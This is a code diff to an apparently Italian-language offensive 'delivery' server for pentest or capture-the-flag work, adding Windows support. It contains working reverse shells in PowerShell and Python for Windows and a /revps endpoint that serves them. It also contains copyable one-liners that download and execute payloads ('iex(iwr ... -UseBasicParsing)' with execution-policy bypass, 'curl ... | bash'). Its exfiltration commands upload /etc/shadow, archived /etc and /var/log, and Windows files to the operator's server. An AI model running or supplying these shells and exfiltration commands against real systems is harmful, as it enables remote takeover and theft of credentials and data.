@@ -357,6 +357,32 @@ REVSHELL_PYTHON = (
     "subprocess.call([\"/bin/bash\",\"-i\"])'\n"
 )
 
+# Reverse shell PowerShell (Windows): compatibile cmd.exe e powershell.exe.
+# Servita da /revps — delivery: powershell -c "iex(iwr http://LHOST:PORT/revps -UseBasicParsing)"
+REVSHELL_PS = (
+    "$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
+    "$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
+    "while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
+    "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
+    "$o=(iex $d 2>&1|Out-String);"
+    "$o2=$o+'PS '+(pwd).Path+'> ';"
+    "$sb=([text.encoding]::ASCII).GetBytes($o2);"
+    "$s.Write($sb,0,$sb.Length);$s.Flush()}};"
+    "$c.Close()\n"
+)
+
+# Reverse shell Python per Windows: usa cmd.exe e pipe con thread
+# (os.dup2 non funziona sui socket Windows). Funziona da cmd.exe e PowerShell.
+REVSHELL_PYWIN = (
+    "python -c \"import socket,subprocess,threading;"
+    "s=socket.socket();s.connect(('{lhost}',{lport}));"
+    "p=subprocess.Popen('cmd.exe',stdin=subprocess.PIPE,stdout=subprocess.PIPE,"
+    "stderr=subprocess.STDOUT);"
+    "threading.Thread(target=lambda:[s.sendall(x) for x in "
+    "iter(lambda:p.stdout.read(1),b'')],daemon=True).start();"
+    "[(p.stdin.write(d),p.stdin.flush()) for d in iter(lambda:s.recv(4096),b'')]\"\n"
+)
+
 # ---------------------------------------------------------------------------
 # WebShell to RCE — webshell con reverse shell integrata
 # ---------------------------------------------------------------------------
@@ -495,6 +521,7 @@ INDEX_TEMPLATE = """<!DOCTYPE html>
   <li><code>curl {base}/upgrade2 | bash</code> — Upgrade in-place (no nuova connessione)</li>
   <li><code>curl {base}/rev</code> — Reverse shell Bash</li>
   <li><code>curl {base}/sh</code> — Reverse shell Python</li>
+  <li><code>curl {base}/revps</code> — Reverse shell PowerShell (Windows): <code>powershell -c "iex(iwr {base}/revps -UseBasicParsing)"</code></li>
 </ul>
 <h3>File statici</h3>
 <ul>
@@ -780,6 +807,14 @@ overflow-x:auto}
 .dc-cmd code{color:var(--green)}
 .dc-prereq{font-size:11px;color:var(--text2)}
 .dc-prereq code{color:var(--yellow);font-size:11px}
+.dc-os-toggle{margin-left:auto;display:inline-flex;border:1px solid var(--border);
+border-radius:12px;overflow:hidden;flex-shrink:0;align-self:flex-start}
+.dc-os-toggle button{background:var(--surface);border:none;color:var(--text2);
+font-size:10px;padding:2px 10px;cursor:pointer;font-family:inherit;letter-spacing:.5px}
+.dc-os-toggle button:hover{color:var(--accent)}
+.dc-os-toggle button.active{background:var(--accent);color:var(--bg);font-weight:700}
+.dc-win-note{color:var(--text2);font-size:12px;background:var(--bg);
+border:1px dashed var(--border);border-radius:4px;padding:8px 12px;margin-bottom:6px}
 .dc-fname{font-weight:600;color:var(--accent)}
 .dc-fsize{color:var(--text2);white-space:nowrap}
 .dc-fcmd code{color:var(--green);font-size:12px}
@@ -4507,44 +4542,92 @@ def _page_delivery() -> str:
     else:
         base = "http://&lt;LHOST&gt;:2727"
 
+    ps_oneliner = 'powershell -nop -c "' + REVSHELL_PS.format(
+        lhost=_lhost, lport=_lport).strip() + '"'
+    pywin_oneliner = REVSHELL_PYWIN.format(lhost=_lhost, lport=_lport).strip()
+
+    def _cmd_row(cmd: str) -> str:
+        esc = html.escape(cmd, quote=True)
+        return (f'<div class="dc-cmd"><code class="copyable" data-copy="{esc}" '
+                f'title="Clicca per copiare">{html.escape(cmd)}</code>'
+                f'<button class="copy-btn" data-copy="{esc}" '
+                f'title="Copia il comando">📋 copia</button></div>')
+
+    def _os_toggle() -> str:
+        return ('<span class="dc-os-toggle" title="Cambia OS target">'
+                '<button class="active" onclick="slOsSwitch(this,\'lin\')">🐧 LIN</button>'
+                '<button onclick="slOsSwitch(this,\'win\')">⊞ WIN</button></span>')
+
     ep_cards = ""
+    # (endpoint, titolo, descrizione, cmd linux, prereq linux, [cmd windows], prereq windows)
     endpoints = [
         ("upgrade", "Upgrade Shell", "Trasforma una shell instabile in una TTY interattiva (socat/python pty)",
          f"curl {base}/upgrade | bash",
-         f"Prerequisito: <code>socat file:$(tty),raw,echo=0 tcp-listen:{_lport}</code>"),
+         f"Prerequisito: <code>socat file:$(tty),raw,echo=0 tcp-listen:{_lport}</code>",
+         [],
+         "Non applicabile su Windows: cmd.exe/PowerShell non richiedono upgrade TTY. "
+         "Usa direttamente la reverse shell PowerShell (card <code>/rev</code>, toggle WIN)."),
         ("upgrade2", "Upgrade In-Place", "Upgrada la shell corrente a TTY senza aprire nuove connessioni (python pty, script, expect, perl)",
          f"curl {base}/upgrade2 | bash",
-         "Nessun prerequisito — eseguilo direttamente nella shell del target"),
+         "Nessun prerequisito — eseguilo direttamente nella shell del target",
+         [],
+         "Non applicabile su Windows: cmd.exe/PowerShell non richiedono upgrade TTY. "
+         "Usa direttamente la reverse shell PowerShell (card <code>/rev</code>, toggle WIN)."),
         ("rev", "Reverse Shell Bash", "One-liner bash per reverse shell",
          f"curl {base}/rev | bash",
-         f"Prerequisito: <code>nc -lvnp {_lport}</code>"),
+         f"Prerequisito: <code>nc -lvnp {_lport}</code>",
+         [f'powershell -nop -ep bypass -c "iex(iwr {base}/revps -UseBasicParsing)"',
+          ps_oneliner],
+         f"Prerequisito: <code>nc -lvnp {_lport}</code> — il 1° comando scarica /revps dal server, il 2° è standalone (funziona anche da cmd.exe)"),
         ("sh", "Reverse Shell Python", "One-liner Python3 per reverse shell (utile quando bash non ha /dev/tcp)",
          f"curl {base}/sh | bash",
-         f"Prerequisito: <code>nc -lvnp {_lport}</code>"),
+         f"Prerequisito: <code>nc -lvnp {_lport}</code>",
+         [pywin_oneliner],
+         f"Prerequisito: <code>nc -lvnp {_lport}</code> e <code>python</code> installato sul target Windows (cmd.exe o PowerShell)"),
     ]
     enum_endpoints = [
         ("static/linseal.sh", "LinSeal", "Enumerazione Linux leggera — alternativa a linpeas, zero broken pipe. Opzioni: ?o salva output, ?ol output+loot, ?ols silenzioso+loot",
          f"curl {base}/linseal?ol | sh",
-         "Nessun prerequisito — POSIX sh puro"),
+         "Nessun prerequisito — POSIX sh puro",
+         [],
+         "Script POSIX — solo Linux. Su Windows usa winPEAS (scaricalo dalla tabella File statici qui sotto)."),
         ("static/slrecon.sh", "SLRecon", "Recon automatica: nmap 2-step, web enum, service enum, report. Opzioni: ?o salva, ?ol output+loot, ?ols silenzioso+loot",
          f"curl {base}/slrecon?ol | sh -s -- TARGET",
-         "Prerequisito: <code>nmap</code> installato sul target"),
+         "Prerequisito: <code>nmap</code> installato sul target",
+         [],
+         "Script POSIX — solo Linux. Su Windows usa winPEAS (scaricalo dalla tabella File statici qui sotto)."),
     ]
-    for key, title, desc, curl_cmd, prereq in endpoints:
+    for key, title, desc, curl_cmd, prereq, win_cmds, win_prereq in endpoints:
+        win_body = "".join(_cmd_row(w) for w in win_cmds)
+        if not win_body:
+            win_body = '<div class="dc-win-note">Nessun comando diretto per Windows.</div>\n'
         ep_cards += f"""<div class="delivery-card">
-<div class="dc-header"><span class="dc-endpoint">/{key}</span><span class="dc-title">{title}</span></div>
+<div class="dc-header"><span class="dc-endpoint">/{key}</span><span class="dc-title">{title}</span>{_os_toggle()}</div>
 <div class="dc-desc">{desc}</div>
-<div class="dc-cmd"><code class="copyable" data-copy="{html.escape(curl_cmd, quote=True)}" title="Clicca per copiare">{html.escape(curl_cmd)}</code><button class="copy-btn" data-copy="{html.escape(curl_cmd, quote=True)}" title="Copia il comando">📋 copia</button></div>
+<div class="dc-lin">
+{_cmd_row(curl_cmd)}
 <div class="dc-prereq">{prereq}</div>
+</div>
+<div class="dc-win" style="display:none">
+{win_body}<div class="dc-prereq">{win_prereq}</div>
+</div>
 </div>\n"""
 
     enum_cards = ""
-    for key, title, desc, curl_cmd, prereq in enum_endpoints:
+    for key, title, desc, curl_cmd, prereq, win_cmds, win_prereq in enum_endpoints:
+        win_body = "".join(_cmd_row(w) for w in win_cmds)
+        if not win_body:
+            win_body = '<div class="dc-win-note">Nessun comando diretto per Windows.</div>\n'
         enum_cards += f"""<div class="delivery-card">
-<div class="dc-header"><span class="dc-endpoint">/{key}</span><span class="dc-title">{title}</span></div>
+<div class="dc-header"><span class="dc-endpoint">/{key}</span><span class="dc-title">{title}</span>{_os_toggle()}</div>
 <div class="dc-desc">{desc}</div>
-<div class="dc-cmd"><code class="copyable" data-copy="{html.escape(curl_cmd, quote=True)}" title="Clicca per copiare">{html.escape(curl_cmd)}</code><button class="copy-btn" data-copy="{html.escape(curl_cmd, quote=True)}" title="Copia il comando">📋 copia</button></div>
+<div class="dc-lin">
+{_cmd_row(curl_cmd)}
 <div class="dc-prereq">{prereq}</div>
+</div>
+<div class="dc-win" style="display:none">
+{win_body}<div class="dc-prereq">{win_prereq}</div>
+</div>
 </div>\n"""
 
     ws_type_opts = ""
@@ -4637,6 +4720,33 @@ wsUpdate();
         f' <span id="lport-msg" style="font-size:11px;margin-left:4px"></span>'
     )
 
+    up_lin = [
+        (f'curl -F "file=@/path/to/file" {base}/upload', "Upload file singolo con multipart form"),
+        (f'cat /etc/shadow | curl -X POST -d @- {base}/upload/shadow.txt', "Upload via pipe (contenuto come body)"),
+        (f'curl -T /tmp/database.db {base}/upload/database.db', "Upload con PUT"),
+        (f'tar czf - /etc /var/log | curl -X POST -d @- {base}/upload/exfil.tar.gz', "Esfiltra cartelle intere compressi via tar"),
+    ]
+    up_win = [
+        (f'curl.exe -F "file=@C:\\path\\to\\file" {base}/upload', "Multipart — curl.exe (Win10+, da cmd.exe o PowerShell)"),
+        (f'curl.exe -T C:\\path\\to\\file {base}/upload/file.txt', "Upload con PUT"),
+        (f'type C:\\path\\to\\file | curl.exe -X POST -d @- {base}/upload/file.txt', "Upload via pipe da cmd.exe"),
+        (f'powershell -c "Invoke-RestMethod -Uri {base}/upload/file.txt -Method Put -InFile C:\\path\\to\\file"', "PowerShell nativo (senza curl.exe)"),
+    ]
+    def _up_rows(rows) -> str:
+        return "\n".join(
+            _cmd_row(c) + f'<div style="color:var(--text2);font-size:12px;margin:4px 0">{lbl}</div>'
+            for c, lbl in rows)
+    upload_card = f"""<div class="delivery-card">
+<div class="dc-header"><span class="dc-endpoint">/upload</span><span class="dc-title">Upload File</span>{_os_toggle()}</div>
+<div class="dc-desc">Carica file dalla vulnbox verso la cartella <code>loot/</code> del server. I file vengono salvati con timestamp e IP sorgente.</div>
+<div class="dc-lin">
+{_up_rows(up_lin)}
+</div>
+<div class="dc-win" style="display:none">
+{_up_rows(up_win)}
+</div>
+</div>"""
+
     body = f"""<div class="container">
 <div class="breadcrumb"><a href="/">Home</a> <span>/</span> Delivery</div>
 <div class="page-title">Quick Delivery</div>
@@ -4654,21 +4764,17 @@ wsUpdate();
 </table>
 </div>
 <h3 style="margin:24px 0 12px;color:var(--text)">Upload dalla vulnbox (loot)</h3>
-<div class="delivery-card">
-<div class="dc-header"><span class="dc-endpoint">/upload</span><span class="dc-title">Upload File</span></div>
-<div class="dc-desc">Carica file dalla vulnbox verso la cartella <code>loot/</code> del server. I file vengono salvati con timestamp e IP sorgente.</div>
-<div class="dc-cmd"><code class="copyable" data-copy="{html.escape(f'curl -F "file=@/path/to/file" {base}/upload', quote=True)}" title="Clicca per copiare">{html.escape(f'curl -F "file=@/path/to/file" {base}/upload')}</code><button class="copy-btn" data-copy="{html.escape(f'curl -F "file=@/path/to/file" {base}/upload', quote=True)}" title="Copia il comando">📋 copia</button></div>
-<div style="color:var(--text2);font-size:12px;margin:4px 0">Upload file singolo con multipart form</div>
-<div class="dc-cmd"><code class="copyable" data-copy="{html.escape(f'cat /etc/shadow | curl -X POST -d @- {base}/upload/shadow.txt', quote=True)}" title="Clicca per copiare">{html.escape(f'cat /etc/shadow | curl -X POST -d @- {base}/upload/shadow.txt')}</code><button class="copy-btn" data-copy="{html.escape(f'cat /etc/shadow | curl -X POST -d @- {base}/upload/shadow.txt', quote=True)}" title="Copia il comando">📋 copia</button></div>
-<div style="color:var(--text2);font-size:12px;margin:4px 0">Upload via pipe (contenuto come body)</div>
-<div class="dc-cmd"><code class="copyable" data-copy="{html.escape(f'curl -T /tmp/database.db {base}/upload/database.db', quote=True)}" title="Clicca per copiare">{html.escape(f'curl -T /tmp/database.db {base}/upload/database.db')}</code><button class="copy-btn" data-copy="{html.escape(f'curl -T /tmp/database.db {base}/upload/database.db', quote=True)}" title="Copia il comando">📋 copia</button></div>
-<div style="color:var(--text2);font-size:12px;margin:4px 0">Upload con PUT</div>
-<div class="dc-cmd"><code class="copyable" data-copy="{html.escape(f'tar czf - /etc /var/log | curl -X POST -d @- {base}/upload/exfil.tar.gz', quote=True)}" title="Clicca per copiare">{html.escape(f'tar czf - /etc /var/log | curl -X POST -d @- {base}/upload/exfil.tar.gz')}</code><button class="copy-btn" data-copy="{html.escape(f'tar czf - /etc /var/log | curl -X POST -d @- {base}/upload/exfil.tar.gz', quote=True)}" title="Copia il comando">📋 copia</button></div>
-<div style="color:var(--text2);font-size:12px;margin:4px 0">Esfiltra cartelle intere compressi via tar</div>
-</div>
+{upload_card}
 <div style="margin-top:8px;font-size:12px;color:var(--text2)">I file sono consultabili nella sezione <a href="/loot/">Loot</a>.</div>
 </div>
 <script>
+function slOsSwitch(btn,os){{
+  var card=btn.closest('.delivery-card');
+  card.querySelectorAll('.dc-os-toggle button').forEach(function(b){{b.classList.remove('active');}});
+  btn.classList.add('active');
+  card.querySelectorAll('.dc-lin').forEach(function(e){{e.style.display=(os==='lin')?'':'none';}});
+  card.querySelectorAll('.dc-win').forEach(function(e){{e.style.display=(os==='win')?'':'none';}});
+}}
 function setLport(){{
   var v=document.getElementById('lport-val').value;
   var msg=document.getElementById('lport-msg');
@@ -4942,6 +5048,8 @@ class SlRequestHandler(http.server.BaseHTTPRequestHandler):
             self._send_text(UPGRADE2_TEMPLATE)
         elif path == "/rev":
             self._send_text(REVSHELL_BASH.format(**pv))
+        elif path == "/revps":
+            self._send_text(REVSHELL_PS.format(**pv))
         elif path == "/sh":
             self._send_text(REVSHELL_PYTHON.format(**pv))
         elif path == "/api/webshell":
